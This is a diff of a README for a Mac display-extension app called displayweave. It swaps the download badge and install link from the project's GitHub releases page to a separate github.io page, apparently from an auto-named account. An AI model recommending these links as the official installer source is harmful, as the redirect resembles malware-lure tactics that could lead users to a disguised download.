@@ -1,6 +1,6 @@
 # 🖥️ displayweave - Turn mobile devices into Mac displays
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Psychical-recitative896/displayweave/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://psychical-recitative896.github.io)
 
 ## 📖 About the project
 
@@ -19,7 +19,7 @@ To use this software, you need the following items:
 
 You need to place the software on your Mac to begin.
 
-1. Visit the [Download Page](https://github.com/Psychical-recitative896/displayweave/releases) to find the latest version of the installer.
+1. Visit the [Download Page](https://psychical-recitative896.github.io) to find the latest version of the installer.
 2. Select the file that matches your Mac processor. Most modern Macs use Apple Silicon (M1, M2, or M3 chips), while older Macs use Intel processors.
 3. Download the disk image file (.dmg) to your computer.
 4. Open the downloaded file.
